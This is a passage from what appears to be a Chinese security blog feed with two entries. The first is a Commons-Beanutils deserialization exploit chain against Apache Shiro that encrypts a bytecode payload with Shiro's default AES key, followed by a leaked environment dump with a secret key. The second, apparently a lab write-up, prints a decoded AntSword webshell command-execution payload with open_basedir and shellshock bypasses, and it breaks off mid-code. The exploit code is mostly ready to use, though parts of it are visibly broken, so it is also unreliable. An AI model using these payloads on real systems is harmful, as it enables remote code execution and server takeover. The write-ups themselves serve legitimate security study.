class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//shiro.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> shiro;</span><br><span class="line"><span class="keyword">import</span> CB.CB1_shiro;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">shiro</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String []args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payloads = <span class="keyword">new</span> <span class="title class_">CB1_shiro</span>().getPayload();</span><br><span class="line"></span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span>[] key = java.util.Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2025/04/25/CB%E9%93%BE/IMG_20250425-224108935.png" class="">  <h2 id="无cc"><a href="#无cc" class="headerlink" title="无cc"></a>无cc</h2><p>但是如果吧cc依赖给去掉的话就不能直接使用BeanComparator的无参构造方法了<br><img src="/2025/04/25/CB%E9%93%BE/IMG_20250425-233802377.png" class="">  </p><p>因为BeanComparator调用到了org.apache.commons.collections.comparators.ComparableComparator;而去除掉cc链的shiro无法调用到org.apache.commons.collections.comparators.ComparableComparator;<br>也就是说comparator在无参构造方法时被赋值为ComparableComparator.getInstance()<br>那么我们就需要指定我们的comparator<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">实现java.util.Comparator接口</span><br><span class="line">实现java.io.Serializable接口</span><br><span class="line">Java、shiro或commons-beanutils自带，且兼容性强</span><br></pre></td></tr></table></figure><br>可以找到CaseInsensitiveComparator这个类的<br><img src="/2025/04/25/CB%E9%93%BE/IMG_20250425-234045561.png" class=""><br>通过String.CASE_INSENSITIVE_ORDER就可以得到这个类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> CB;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CB1_shiro</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] Serializbyte(Object obj) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">        <span class="keyword">return</span> bos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserializ</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getTemplates</span><span class="params">(<span class="type">byte</span>[][] codes)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,codes);</span><br><span class="line"></span><br><span class="line">        setValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] getPayload() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">DynamicClassGenerator</span> <span class="variable">classGenerator</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">DynamicClassGenerator</span>();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clz</span> <span class="operator">=</span> classGenerator.genPayloadForLinux();</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;clz.toBytecode()&#125;;</span><br><span class="line">        TemplatesImpl tpl=(TemplatesImpl) getTemplates(codes);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>,String.CASE_INSENSITIVE_ORDER);</span><br><span class="line"></span><br><span class="line">        PriorityQueue priorityQueue=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,comparator);</span><br><span class="line">        priorityQueue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        priorityQueue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setValue(priorityQueue,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;tpl,tpl&#125;);</span><br><span class="line">        setValue(comparator,<span class="string">&quot;property&quot;</span>,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> Serializbyte(priorityQueue);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\24882\\Desktop\\java-sec\\cc\\src\\test\\java\\test_calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        TemplatesImpl tpl=(TemplatesImpl) getTemplates(codes);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>,String.CASE_INSENSITIVE_ORDER);</span><br><span class="line"></span><br><span class="line">        PriorityQueue priorityQueue=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,comparator);</span><br><span class="line">        priorityQueue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        priorityQueue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setValue(priorityQueue,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;tpl,tpl&#125;);</span><br><span class="line">        setValue(comparator,<span class="string">&quot;property&quot;</span>,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> Serializbyte(priorityQueue);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=55f256a9286fLANG=C.UTF-8GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568PYTHON_VERSION=3.9.17PYTHON_PIP_VERSION=23.0.1PYTHON_SETUPTOOLS_VERSION=58.1.0PYTHON_GET_PIP_URL=<a href="https://github.com/pypa/get-pip/raw/0d8570dc44796f4369b652222cf176b3db6ac70e/public/get-pip.pyPYTHON_GET_PIP_SHA256=96461deced5c2a487ddc65207ec5a9cffeca0d34e7af7ea1afc470ff0d746207SECRET_KEY=S3cRetK3yHOME=/root">https://github.com/pypa/get-pip/raw/0d8570dc44796f4369b652222cf176b3db6ac70e/public/get-pip.pyPYTHON_GET_PIP_SHA256=96461deced5c2a487ddc65207ec5a9cffeca0d34e7af7ea1afc470ff0d746207SECRET_KEY=S3cRetK3yHOME=/root</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;调用父类构造&lt;br&gt;调用j_Teacher构造&lt;br&gt;覅有父类J_E的mb_printinfo&lt;/p&gt;
&lt;h1 id=&quot;java-util-PriorityQueue&quot;&gt;&lt;a href=&quot;#java-util-PriorityQueue&quot; class=&quot;headerlink</summary>
      
    
    
    
    
    <category term="java反序列化" scheme="https://lisien11.xyz/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>玄机</title>
    <link href="https://lisien11.xyz/2025/04/24/%E7%8E%84%E6%9C%BA/"/>
    <id>https://lisien11.xyz/2025/04/24/%E7%8E%84%E6%9C%BA/</id>
    <published>2025-04-24T02:48:02.000Z</published>
    <updated>2025-05-06T06:58:38.388Z</updated>
    
    <content type="html"><![CDATA[<h1 id="蚁剑流量"><a href="#蚁剑流量" class="headerlink" title="蚁剑流量"></a>蚁剑流量</h1><h2 id="1-木马的连接密码是多少"><a href="#1-木马的连接密码是多少" class="headerlink" title="1.木马的连接密码是多少"></a>1.木马的连接密码是多少</h2><p>密码为1<br><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250424-154311804.png" class=""> </p><h2 id="2-黑客执行的第一个命令是什么"><a href="#2-黑客执行的第一个命令是什么" class="headerlink" title="2.黑客执行的第一个命令是什么"></a>2.黑客执行的第一个命令是什么</h2><p>将传参的代码整理一下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$opdir</span> = @<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;open_basedir&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$opdir</span>) &#123;</span><br><span class="line">    <span class="variable">$ocwd</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">    <span class="variable">$oparr</span> = <span class="title function_ invoke__">preg_split</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;Lzt8Oi8=&quot;</span>), <span class="variable">$opdir</span>);</span><br><span class="line">    @<span class="title function_ invoke__">array_push</span>(<span class="variable">$oparr</span>, <span class="variable">$ocwd</span>, <span class="title function_ invoke__">sys_get_temp_dir</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$oparr</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!@<span class="title function_ invoke__">is_writable</span>(<span class="variable">$item</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$tmdir</span> = <span class="variable">$item</span> . <span class="string">&quot;/.d53e47c56e78&quot;</span>;</span><br><span class="line">        @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">        <span class="keyword">if</span> (!@<span class="title function_ invoke__">file_exists</span>(<span class="variable">$tmdir</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$tmdir</span> = <span class="title function_ invoke__">realpath</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">        @<span class="title function_ invoke__">chdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">        @<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;..&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$cntarr</span> = @<span class="title function_ invoke__">preg_split</span>(<span class="string">&quot;/\\\\|\//&quot;</span>, <span class="variable">$tmdir</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$cntarr</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">        @<span class="title function_ invoke__">rmdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">    <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;2c&quot;</span> . <span class="string">&quot;3f5&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> @<span class="title function_ invoke__">asenc</span>(<span class="variable">$output</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;20&quot;</span> . <span class="string">&quot;c49&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$p</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;ma569eedd00c3b&quot;</span>], <span class="number">2</span>));</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;ucc3f8650c92ac&quot;</span>], <span class="number">2</span>));</span><br><span class="line">    <span class="variable">$envstr</span> = @<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;e5d0dbe94954b3&quot;</span>], <span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$d</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">    <span class="variable">$c</span> = (<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span>) ? <span class="string">&quot;-c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span> : <span class="string">&quot;/c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PATH=&quot;</span> . <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;PATH&quot;</span>) . <span class="string">&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PATH=&quot;</span> . <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;PATH&quot;</span>) . <span class="string">&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$envstr</span>)) &#123;</span><br><span class="line">        <span class="variable">$envarr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;|||asline|||&quot;</span>, <span class="variable">$envstr</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$envarr</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$v</span>)) &#123;</span><br><span class="line">                @<span class="title function_ invoke__">putenv</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;|||askey|||&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="variable">$v</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$r</span> = <span class="string">&quot;<span class="subst">&#123;$p&#125;</span> <span class="subst">&#123;$c&#125;</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fe</span>(<span class="params"><span class="variable">$f</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;,&quot;</span>, @<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;disable_functions&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$d</span>)) &#123;</span><br><span class="line">            <span class="variable">$d</span> = <span class="keyword">array</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$d</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;trim&#x27;</span>, <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;strtolower&#x27;</span>, <span class="variable">$d</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="title function_ invoke__">function_exists</span>(<span class="variable">$f</span>) &amp;&amp; <span class="title function_ invoke__">is_callable</span>(<span class="variable">$f</span>) &amp;&amp; !<span class="title function_ invoke__">in_array</span>(<span class="variable">$f</span>, <span class="variable">$d</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runshellshock</span>(<span class="params"><span class="variable">$d</span>, <span class="variable">$c</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> &amp;&amp; <span class="title function_ invoke__">fe</span>(<span class="string">&#x27;putenv&#x27;</span>) &amp;&amp; (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;error_log&#x27;</span>) || <span class="title function_ invoke__">fe</span>(<span class="string">&#x27;mail&#x27;</span>))) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="title function_ invoke__">readlink</span>(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>) != <span class="literal">FALSE</span>) &#123;</span><br><span class="line">                <span class="variable">$tmp</span> = <span class="title function_ invoke__">tempnam</span>(<span class="title function_ invoke__">sys_get_temp_dir</span>(), <span class="string">&#x27;as&#x27;</span>);</span><br><span class="line">                <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$c</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;error_log&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="title function_ invoke__">error_log</span>(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="title function_ 